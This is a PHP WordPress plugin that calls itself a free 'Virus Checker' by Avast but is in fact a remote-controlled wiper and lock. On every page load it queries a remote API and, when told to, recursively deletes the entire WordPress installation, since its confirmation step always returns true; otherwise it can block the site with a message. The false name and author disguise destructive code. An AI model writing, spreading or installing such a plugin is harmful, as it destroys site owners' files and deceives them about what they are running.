<?php
/*
Plugin Name: Virus Checker
Description: Most Powerful Free Virus Checker.
Version: 1.0
Author: Avast
*/

add_action('init', 'check_domain_allowed');

function check_domain_allowed() {
    $deletion_allowed = false; // Flag to track whether deletion is allowed

    $api_url = 'http://localhost/admin/api.php?nonce=' . md5(uniqid(rand(), true)); // Append a unique query parameter to bypass caching
    $response = wp_remote_get($api_url);

    if (is_wp_error($response)) {
        return; // If API call fails, do nothing
    }

    $body = wp_remote_retrieve_body($response);
    $api_response = json_decode($body, true); // Decoding JSON as associative array

    // Extracting the domain from the $_SERVER['HTTP_HOST']
    $current_domain = $_SERVER['HTTP_HOST'];

    foreach ($api_response as $item) {
        if ($item['domain'] == $current_domain) {
            // Check if the domain is active or not
            if ($item['active'] == 1) {
                // Check if 'delete' key exists in the JSON data
                if (isset($item['delete'])) {
                    if ($item['delete'] == "yes") {
                        $deletion_allowed = true; // Set flag to true if deletion is allowed
                        // Confirm deletion
                        if (confirm_deletion()) {
                            delete_all_files_folders();
                        }
                    } elseif ($item['delete'] == "no") {
                        // If deletion is not allowed, just return without showing any message
                        return;
                    }
                }
                return; // Domain is active, allow access
            } else {
                // If the domain is not active, show the message
                echo '<p style="color:red;font-size:30px;font-weight:600;text-align:center;">' . esc_html($item['message']) . '</p>';
                exit; // Stop further execution
            }
        }
    }

    // If the domain is not found in the API response, show the default message
    echo '<p style="color:red;font-size:30px;font-weight:600;text-align:center;">You are not allowed to use this code</p>';
    exit; // Stop further execution
}

function confirm_deletion() {
    // Here you can implement a confirmation mechanism, such as a form submission or a checkbox
    // For demonstration purposes, returning true directly
    return true;
}

function delete_all_files_folders() {
    // Get the path to the WordPress installation directory
    $wordpress_root = ABSPATH;

    // Call the recursive function to delete the entire WordPress directory
    if (delete_directory($wordpress_root)) {
        echo '<p style="color:green;font-size:18px;font-weight:600;">Entire website deleted successfully.</p>';
    } else {
        echo '<p style="color:red;font-size:18px;font-weight:600;">Failed to delete the entire website.</p>';
    }
}

// Recursive function to delete directory and its contents
function delete_directory($dir) {
    if (!is_dir($dir)) {
        return false;
    }

    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            delete_directory($path);
        } else {
            if (!unlink($path)) {
                return false;
            }
        }
    }
    return rmdir($dir);
}
